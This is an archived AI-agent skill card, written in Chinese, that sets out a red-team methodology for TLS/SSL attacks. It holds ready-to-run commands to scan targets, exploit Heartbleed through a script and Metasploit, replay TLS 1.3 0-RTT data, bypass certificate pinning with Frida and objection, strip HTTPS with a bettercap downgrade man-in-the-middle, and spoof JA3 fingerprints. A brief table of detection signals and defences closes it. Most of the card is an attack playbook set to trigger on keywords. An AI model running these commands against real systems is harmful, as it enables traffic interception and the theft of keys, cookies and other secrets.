<!-- archived from /root/.hermes/skills/security/tls-ssl-attacks/SKILL.md on 2026-10-21 -->

---
name: tls-ssl-attacks
description: |
  TLS/SSL 攻击方法论：POODLE、DROWN、Heartbleed、BEAST、CRIME/BREACH、
  Logjam、FREAK、Sweet32、ROBOT、Raccoon、证书钉扎绕过、0-RTT 重放、
  降级攻击、密码套件枚举、中间人劫持。
  触发词：TLS attack、SSL vulnerability、certificate pinning bypass、
  POODLE、DROWN、Heartbleed、0-RTT replay、downgrade attack、testssl。
version: "1.0"
---

> 归档卡：原目录 `/root/.hermes/skills/security/tls-ssl-attacks`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/tls-ssl-attacks/…')`，不要相对 `references/legacy/` 解析。

# TLS/SSL 攻击 — 红队方法论

> 来源：claude-red `offensive-tls-attacks` 适配。
> 与 `crypto-toolkit` 互补：本卡专注 TLS/SSL 协议攻击面。

## 快速工作流

1. **枚举**：`testssl.sh` / `sslyze` 扫描目标，列出支持的协议版本和密码套件
2. **识别弱点**：对照已知漏洞（POODLE/DROWN/Heartbleed/等）
3. **利用**：选择适用的攻击向量
4. **降级**：如果目标支持多版本，尝试协议降级
5. **中间人**：如果可以拦截流量，尝试解密或注入

---

## 侦察与枚举

### testssl.sh

```bash
# 全面扫描
testssl.sh --full https://target.com

# 快速检查特定漏洞
testssl.sh --vulnerable https://target.com

# 检查特定协议
testssl.sh --protocols https://target.com

# JSON 输出便于自动化
testssl.sh --jsonfile result.json https://target.com
```

### sslyze

```bash
# 全面扫描
sslyze --regular target.com

# 检查 Heartbleed
sslyze --heartbleed target.com

# 检查证书
sslyze --certinfo target.com
```

### Nmap NSE

```bash
nmap --script ssl-enum-ciphers -p 443 target.com
nmap --script ssl-heartbleed -p 443 target.com
nmap --script ssl-poodle -p 443 target.com
nmap --script ssl-dh-params -p 443 target.com
```

---

## 经典漏洞

### Heartbleed（CVE-2014-0160）

OpenSSL 1.0.1–1.0.1f 中 TLS heartbeat 扩展的缓冲区越读。每次请求最多泄露 64KB 服务器内存（私钥、会话密钥、Cookie）。

```bash
# 检测
nmap --script ssl-heartbleed -p 443 target.com

# 利用
python3 heartbleed.py target.com -p 443
# 或 Metasploit
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS target.com
run
```

### POODLE（CVE-2014-3566）

SSLv3 中 CBC 模式的 padding oracle。降级到 SSLv3 后，逐字节恢复明文。

```bash
# 检测
testssl.sh --poodle target.com
nmap --script ssl-poodle -p 443 target.com

# 利用条件：需要 MitM 位置 + 受害者浏览器发请求
# TLS_FALLBACK_SCSV 防降级——检查是否支持
```

### DROWN（CVE-2016-0800）

利用 SSLv2 的弱点解密 TLS 连接。如果同一私钥用于支持 SSLv2 的服务器，可跨服务器攻击。

```bash
# 检测
testssl.sh --drown target.com

# 如果目标的证书在其他服务器上也用了且那台支持 SSLv2
# → 跨服务器 DROWN
```

### BEAST（CVE-2011-3389）

TLS 1.0 中 CBC 模式的已知 IV 攻击。需要 MitM + 控制明文片段。

### CRIME / BREACH

- **CRIME**：利用 TLS 压缩泄露秘密（如 Cookie）
- **BREACH**：利用 HTTP 压缩泄露秘密（更实用）

```bash
# 检测 BREACH：目标返回压缩响应 + 响应中包含用户输入 + 包含秘密
curl -H "Accept-Encoding: gzip,deflate" -I https://target.com
# 如果 Content-Encoding: gzip → 可能存在
```

### Logjam（CVE-2015-4000）

弱 DH 参数（512/768/1024 bit）允许降级到 export-grade 密码套件。

```bash
testssl.sh --logjam target.com
nmap --script ssl-dh-params -p 443 target.com
```

### ROBOT（Return Of Bleichenbacher's Oracle Threat）

RSA PKCS#1 v1.5 加密中的 padding oracle。可用于解密 TLS 预主密钥。

```bash
# 检测
python3 robot-detect.py -h target.com
```

---

## 现代攻击

### 0-RTT 重放（TLS 1.3）

TLS 1.3 的 0-RTT 早期数据不提供前向保密，可被重放。

```bash
# 检测目标是否接受 0-RTT
openssl s_client -connect target.com:443 -tls1_3 -early_data payload.txt

# 利用：捕获 0-RTT 数据 → 重放到服务器
# 适用于非幂等操作（转账、投票、购买）
```

### 证书钉扎绕过

```bash
# Android 7+ 默认不信任用户安装的 CA
# 绕过方法：
# 1. Frida hook
frida -U -f com.target.app -l ssl-pinning-bypass.js

# 2. objection
objection -g com.target.app explore
android sslpinning disable

# 3. 修改 APK 的 network_security_config.xml
# 添加信任用户 CA 的配置，重新签名安装
```

### 降级攻击

```bash
# 使用 bettercap 进行 TLS 降级中间人
bettercap -eval "set net.sniff.verbose true; set https.proxy.sslstrip true; https.proxy on; net.sniff on"

# sslstrip+ 绕过 HSTS
# 将 HTTPS 链接替换为相似的 HTTP 域名
```

### JA3/JA3S 指纹

```bash
# 查看自己的 JA3 指纹
curl -s https://ja3er.com/json

# 伪造 JA3 指纹以匹配合法浏览器
# 使用 curl-impersonate 或自定义 TLS 客户端
curl-impersonate-chrome https://target.com
```

---

## 检测 / 防守视角

| 攻击 | 检测信号 | 防御 |
|------|----------|------|
| Heartbleed | 异常 heartbeat 请求大小 | 升级 OpenSSL |
| POODLE | SSLv3 连接 | 禁用 SSLv3 |
| DROWN | SSLv2 连接 | 禁用 SSLv2，确保私钥不共用 |
| 降级 | `TLS_FALLBACK_SCSV` 缺失 | 启用降级保护 |
| 0-RTT 重放 | 重复的 early_data | 服务端校验幂等性 |
| 钉扎绕过 | 用户 CA 被信任 | 双向认证 + 钉扎 |

---

## 与本库其他 Skill 的关系

| 需求 | 走哪张卡 |
|------|----------|
| TLS/SSL 协议攻击 | **本卡** |
| 密码学实现攻击（padding oracle/ECB/PRNG） | `crypto-toolkit` |
| 证书 SAN 拓线 / CDN 溯源 | `cdn-origin-tracing` |
| 移动端证书钉扎绕过 | `apk-reverse` / `ios-pentest` |
| 网络层中间人 | `wifi-wireless` / `intranet-penetration-testing` |
